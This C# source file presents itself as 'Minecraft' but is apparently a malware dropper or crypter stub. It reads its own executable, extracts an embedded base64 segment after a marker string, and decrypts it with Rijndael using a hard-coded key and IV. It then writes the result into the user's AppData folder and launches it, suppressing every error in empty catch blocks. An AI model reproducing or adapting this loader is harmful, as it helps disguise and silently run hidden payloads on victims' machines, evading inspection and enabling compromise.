using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace Minecraft;

internal class Minecraft
{
	private static byte[] Chips;

	private static string[] fileInfo;

	private static string ProgrammaTekst;

	private static string AppDataMap;

	private static string[] MinecraftSpl = new string[1] { "[dp68jPAhkES6GzT5hHtLE9]" };

	private static void Main(string[] args)
	{
		try
		{
			ProgrammaTekst = Ralt();
			AppDataMap = Zoekmap();
			fileInfo = Minecraften();
			Chips = Minecraftje(Convert.FromBase64String(fileInfo[1]));
			BioWriter();
			StaProDia();
		}
		catch
		{
		}
	}

	private static int BioWriter()
	{
		try
		{
			File.WriteAllBytes(AppDataMap + "\\" + fileInfo[2], Chips);
			return 1;
		}
		catch
		{
			return 0;
		}
	}

	private static string Zoekmap()
	{
		try
		{
			return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		}
		catch
		{
			return "";
		}
	}

	private static int StaProDia()
	{
		try
		{
			Process.Start(AppDataMap + "\\" + fileInfo[2]);
			return 1;
		}
		catch
		{
			return 0;
		}
	}

	private static string[] Minecraften()
	{
		try
		{
			return ProgrammaTekst.Split(MinecraftSpl, StringSplitOptions.None);
		}
		catch
		{
			return new string[2] { "a", "b" };
		}
	}

	private static string Ralt()
	{
		try
		{
			return File.ReadAllText(Process.GetCurrentProcess().MainModule!.FileName);
		}
		catch
		{
			return "";
		}
	}

	private static byte[] Minecraftje(byte[] RijnKey)
	{
		try
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			byte[] iV = new byte[16]
			{
				1, 2, 3, 4, 5, 6, 7, 8, 9, 1,
				2, 3, 4, 5, 6, 7
			};
			byte[] key = new byte[16]
			{
				7, 6, 5, 4, 3, 2, 1, 9, 8, 7,
				6, 5, 4, 3, 2, 1
			};
			rijndaelManaged.IV = iV;
			rijndaelManaged.Key = key;
			return rijndaelManaged.CreateDecryptor().TransformFinalBlock(RijnKey, 0, RijnKey.Length);
		}
		catch
		{
			return null;
		}
	}
}
